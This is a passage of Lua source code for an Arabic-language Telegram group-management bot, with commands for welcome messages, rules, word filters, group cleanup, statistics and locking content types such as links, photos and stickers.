if text == 'الغاء' then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء حفظ الترحيب ", 1, "md")
faederdx1:del(FAEDER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
faederdx1:del(FAEDER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
faederdx1:set(FAEDER..'get:welcome'..msg.chat_id_,text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الترحيب \n", 1, "md")
return false   
end
if text and text:match("^ضع ترحيب$") and faeder11(msg) or text and text:match("^وضع ترحيب$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي الترحيب الان :\n↫ يمكن اضافه للترحيب ما يلي :\n         ───────────────\n- `name` ~ داله عرض الاسم\n- `@user` ~ داله عرض المعرف\n↫ فقط اضغط على الداله سيتم نسخها\n         ───────────────\n↫ للخروج ارسل  ( الغاء )\n ', 1, 'md')
faederdx1:set(FAEDER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and faeder11(msg) or text and text:match("^مسح الترحيب$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حذف الترحيب ', 1, 'md')
faederdx1:del(FAEDER..'get:welcome'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and faeder11(msg) or text and text:match("^الترحيب$") and faeder11(msg) then
local wel = faederdx1:get(FAEDER..'get:welcome'..msg.chat_id_)
if wel then
faederdx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ لم يتم وضع الترحيب ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء حفظ القوانين ', 1, 'md')
faederdx1:del(FAEDER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
faederdx1:del(FAEDER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
faederdx1:set(FAEDER..'bot:rules'..msg.chat_id_,text)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ القوانين ', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and faeder11(msg) or text and text:match("^وضع قوانين$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي القوانين الان \n↫ للرجوع ارسل { الغاء } ', 1, 'md')
faederdx1:set(FAEDER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if faederdx1:get(FAEDER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء حفظ الوصف ', 1, 'md')
faederdx1:del(FAEDER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
faederdx1:del(FAEDER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..tokenbot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ الوصف ', 1, 'md')
return false  
end
if text and text:match("^ضع وصف$") and faeder11(msg) or text and text:match("^وضع وصف$") and faeder11(msg) then  
faederdx1:set(FAEDER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي الوصف الان \n↫ للرجوع ارسل { الغاء } ', 1, 'md')
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^منع (.*)$") then
local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
local filterss = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local hash = (FAEDER..'bot:filters:'..msg.chat_id_)
faederdx1:hset(hash, name,'newword')
faederdx(msg.chat_id_, msg.id_, 1, "↫ الكلمه ( "..name.." )\n↫ تم منعها ", 1, 'md')
end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء منع (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (FAEDER..'bot:filters:'..msg.chat_id_)
if not faederdx1:hget(FAEDER..hash, name) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ الكلمه ( "..name.." )\n↫ هي غير ممنوعه في المجموعه ", 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ الكلمه ( "..name.." )\n↫ تم الغاء منعها ", 1, 'md')
faederdx1:hdel(hash, name)
end end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فلتر عام (.*)$") then
local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filterss[2], 1, 50)
local hash = (FAEDER..'bot:freewords:')
faederdx1:hset(hash, name,'newword')
faederdx(msg.chat_id_, msg.id_, 1, "↫ الكلمه ( "..name.." )\n↫ تم منعها عام ", 1, 'md')
end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء منع عام (.*)$") then
local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
local name = string.sub(rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (FAEDER..'bot:freewords:')
if not faederdx1:hget(hash, name)then
faederdx(msg.chat_id_, msg.id_, 1, "↫ الكلمه ( "..name.." )\n↫ هي ليست ممنوعه عام ", 1, 'html')
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ الكلمه ( "..name.." )\n↫ تم منعها عام ", 1, 'html')
faederdx1:hdel(hash, name)
end end end
--     By Developer Faeder     -- 
if text and text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gps = faederdx1:scard(FAEDER.."bot:groups")
local users = faederdx1:scard(FAEDER.."bot:userss")
local allmgs = faederdx1:get(FAEDER.."bot:allmsgs")
if faederdx1:get(FAEDER..'autoleave') == "On" then
autoleavear = "مفعل "
elseif faederdx1:get(FAEDER..'autoleave') == "Off" then
autoleavear = "معطل "
elseif not faederdx1:get(FAEDER..'autoleave') then
autoleavear = "معطل "
end
if faederdx1:get(FAEDER..'clerk') == "On" then
clerkar = "مفعل "
elseif faederdx1:get(FAEDER..'clerk') == "Off" then
clerkar = "مفعل "
elseif not faederdx1:get(FAEDER..'clerk') then
clerkar = "مفعل "
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ احصائيات البوت \n         ───────────────~~\n↫ عدد القروبات '..gps..'\n↫ عدد الاعضاء '..users..' \n↫ عدد كل رسائل المجموعات '..allmgs..'\n↫ المغادره التلقائيه '..autoleavear..'\n↫ رساله ستارت '..clerkar, 1, 'md')
end 
--     By Developer Faeder     -- 
if text == 'تغيير C' then

    if not is_leader(msg) then
    send(msg.chat_id_,msg.id_,' هذا الامر خاص Devil فقط')
    return false
    end
    faederdx1:set(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_,true)
    send(msg.chat_id_, msg.id_,' ارسل الان معرف Devil الجديد')
    return false
    end
    if text and faederdx1:get(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_) then
    if text == 'الغاء' then 
    faederdx1:del(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_)
    send(msg.chat_id_, msg.id_,' تم الغاء تغيير Carbon')
    return false
    end
    local username = text:gsub('@','')
    tdcli_function ({ID = "SearchPublicChat",username_ = username}, function(extra, result, success)
    if result.id_ then
    if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
    send(msg.chat_id_,msg.id_,"• عذرا عزيزي هذا معرف قناة يرجى ارسال المعرف مره اخره")   
    return false 
    end      
    local file_config = io.open("Config.lua", 'w')
    file_config:write([[
    do local _ = {
        SUDO = ]]..sudo..[[,
        bot_id = "]]..bot_id..[[",
        sudo_users = {
          ]]..sudo..[[
        },
        token = "]]..token..[[",
        username = "]]..SudoFaeder..[["
      }
      return _
      end
    ]])
    file_config:close()
    else
    send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
    end
    end, nil)
    redis:del(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_)
    send(msg.chat_id_, msg.id_,'تم تغيير Devil \n الرجاء ارسل امر [تحديث]')
    dofile('Config.lua')  
    return false
    end
---------------------------------------------------
if text == "تنظيف القروبات" and is_sudo(msg) then 
local group = faederdx1:smembers(FAEDER.."bot:groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m←← THE BOT IS NOT ADMIN ↓\n←← '..group[i]..'\n\27[1;37m')
faederdx1:srem(FAEDER.."bot:groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
faederdx1:srem( FAEDER.."bot:groups",group[i]) 
q = q + 1
print('\27[30;35m←← THE BOT IS LEFT GROUP ↓\n←← '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
faederdx1:srem( FAEDER.."bot:groups",group[i]) 
q = q + 1
print('\27[30;36m←← THE BOT IS KICKED GROUP ↓\n←← '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
faederdx1:srem( FAEDER.."bot:groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
faederdx(msg.chat_id_, msg.id_, 1,'↫ لا يوجد قروبات وهميه \n', 1, 'md')
else
local faederddx2 = (w + q)
local faederdx3 = #group - faederddx2
if q == 0 then
faederddx2 = ''
else
faederddx2 = '\n*↫ تم مسح ← { '..q..' } مجموعه من البوت*' 
end
if w == 0 then
faederddx1 = ''
else
faederddx1 = '\n*↫ تم مسح ← { '..w..' } قروب بسبب تنزيل البوت عضو*'
end
faederdx(msg.chat_id_, msg.id_, 1,'*↫ عدد القروبات الان ← { '..#group..' }*'..faederddx1..''..faederddx2..'\n*↫ العدد الحقيقي الان ← ( '..faederdx3..' ) قروب*\n', 1, 'md')
end end end,nil) end
return false
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "تنظيف ميديا" or text == "تنظيف الميديا" and faeder11(msg) then   
faeder = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
faeder[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = faeder},function(arg,data)
new = 0
faeder2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
faeder2[new] = data.messages_[i].id_
new = new + 1
end end
delete_msg(msg.chat_id_,faeder2)
end,nil)  
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تنظيف 100 من الميديا ", 1, 'md')
end end
--     By Developer Faeder     -- 
if text and text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ اسم المجموعه {"..title_name(msg.chat_id_).."}", 1, 'md')
end 
--     By Developer Faeder     -- 
if text and text:match("^تنظيف الرسائل$") and is_sudo(msg) then
faederdx1:del(FAEDER.."bot:allmsgs")
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تنظيف عدد رسائل القروبات ', 'md')
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and faeder11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور '
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير '
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن '
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير '
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن '          
end
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if faederdx1:get(FAEDER..'editmsg'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← التعديل  \n) ' 
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'editmsg'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← التعديل سابقا ', 1, 'md')
end end
if unlockpts[2] == "الفارسيه" then
if faederdx1:get(FAEDER..'farsi'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الفارسيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'farsi'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الفارسيه سابقا ', 1, 'md')
end end
if unlockpts[2] == "الفارسيه بالطرد" then
if faederdx1:get(FAEDER..'farsiban'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الفارسيه بالطرد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 63, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'farsiban'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الفارسيه بالطرد سابقا ', 1, 'md')
end end
if unlockpts[2] == "الشارحه" then
if faederdx1:get(FAEDER..'bot:cmds'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الشارحه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:cmds'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الشارحه سابقا ', 1, 'md')
end end
if unlockpts[2] == "البوتات" then
if faederdx1:get(FAEDER..'bot:bots:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← البوتات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:bots:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← البوتات سابقا ', 1, 'md')
end end
if unlockpts[2] == "البوتات بالطرد" then
if faederdx1:get(FAEDER..'bot:bots:ban'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← البوتات بالطرد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 62, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:bots:ban'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← البوتات بالطرد سابقا ', 1, 'md')
end end
if unlockpts[2] == "البوتات بالتقييد" then
if faederdx1:get(FAEDER..'keed_bots'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← البوتات بالتقييد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 64, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'keed_bots'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← البوتات بالتقييد سابقا ', 1, 'md')
end end
if unlockpts[2] == "التكرار" then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then 
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← التكرار  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'anti-flood:'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← التكرار سابقا ', 1, 'md')
end end
if unlockpts[2] == "التثبيت" then
if faederdx1:get(FAEDER..'bot:pin:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← التثبيت  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:pin:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← التثبيت سابقا ', 1, 'md')
end end end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل الكل بالساعات (%d+)$") and faeder11(msg) then
local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
faederdx1:setex(FAEDER..'bot:muteall'..msg.chat_id_, num, true)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم قفل الكل لمده "..mutept[1].." ساعه ", 'md')
end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and faeder11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور '
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير '
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن '
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير '
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن '          
end
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutepts[2] == "الدردشه" then
if not faederdx1:get(FAEDER..'bot:text:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الدردشه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:text:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الدردشه سابقا ', 1, 'md')
end end
if mutepts[2] == "الاونلاين" then
if not faederdx1:get(FAEDER..'bot:inline:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الاونلاين  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:inline:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الاونلاين سابقا ', 1, 'md')
end end
if mutepts[2] == "الصور" then
if not faederdx1:get(FAEDER..'bot:photo:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الصور  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 53, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:photo:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الصور سابقا ', 1, 'md')
end end
if mutepts[2] == "الكلايش" then
if not faederdx1:get(FAEDER..'bot:spam:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الكلايش  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:spam:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الكلايش سابقا ', 1, 'md')
end end
if mutepts[2] == "الفيديو" then
if not faederdx1:get(FAEDER..'bot:video:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الفيديو  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:video:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الفيديو سابقا ', 1, 'md')
end end
if mutepts[2] == "المتحركه" then
if not faederdx1:get(FAEDER..'bot:gifs:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← المتحركه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:gifs:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← المتحركه سابقا ', 1, 'md')
end end
if mutepts[2] == "الاغاني" then
if not faederdx1:get(FAEDER..'bot:music:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الاغاني  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:music:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الاغاني سابقا ', 1, 'md')
end end
if mutepts[2] == "الصوت" then
if not faederdx1:get(FAEDER..'bot:voice:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الصوت  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 53, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:voice:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الصوت سابقا ', 1, 'md')
end end
if mutepts[2] == "الروابط" then
if not faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الروابط  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:links:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الروابط سابقا ', 1, 'md')
end end
if mutepts[2] == "المواقع" then
if not faederdx1:get(FAEDER..'bot:location:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← المواقع  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:location:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← المواقع سابقا ', 1, 'md')
end end
if mutepts[2] == "المعرف" then
if not faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← المعرف  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 51, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'tags:lock'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← المعرف سابقا ', 1, 'md')
end end
if mutepts[2] == "الدخول" then
if not faederdx1:get(FAEDER..'Lock:Join'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الدخول  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'Lock:Join'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الدخول سابقا ', 1, 'md')
end end
if  mutepts[2] == "الحمايه" then
if not faederdx1:get(FAEDER..'bot:strict'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الحمايه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:strict'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الحمايه سابقا ', 1, 'md')
end end
if mutepts[2] == "الملفات" then
if not faederdx1:get(FAEDER..'bot:document:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الملفات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:document:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الملفات سابقا ', 1, 'md')
end end
if mutepts[2] == "الهاشتاك" then
if not faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الهاشتاك  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:hashtag:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الهاشتاك سابقا ', 1, 'md')
end end
if mutepts[2] == "الجهات" then
if not faederdx1:get(FAEDER..'bot:contact:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الجهات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:contact:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الجهات سابقا ', 1, 'md')
end end
if mutepts[2] == "الشبكات" then
if not faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الشبكات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:webpage:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الشبكات سابقا ', 1, 'md')
end end
if mutepts[2] == "العربيه" then
if not faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← العربيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:arabic:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← العربيه سابقا ', 1, 'md')
end end
if mutepts[2] == "الانقليزيه" then
if not faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الانقليزيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:english:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الانقليزيه سابقا ', 1, 'md')
end end
if mutepts[2] == "الملصقات" then
if not faederdx1:get(FAEDER..'bot:sticker:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الملصقات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:sticker:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الملصقات سابقا ', 1, 'md')
end end
if mutepts[2] == "الماركداون" then
if not faederdx1:get(FAEDER..'markdown:lock'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الماركداون  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'markdown:lock'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الماركداون سابقا ', 1, 'md')
end end
if mutepts[2] == "الاشعارات" then
if not faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الاشعارات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:tgservice:jk'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الاشعارات سابقا ', 1, 'md')
end end
if mutepts[2] == "السب" then
if not faederdx1:get(FAEDER.."fshar"..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← السب  \n) '
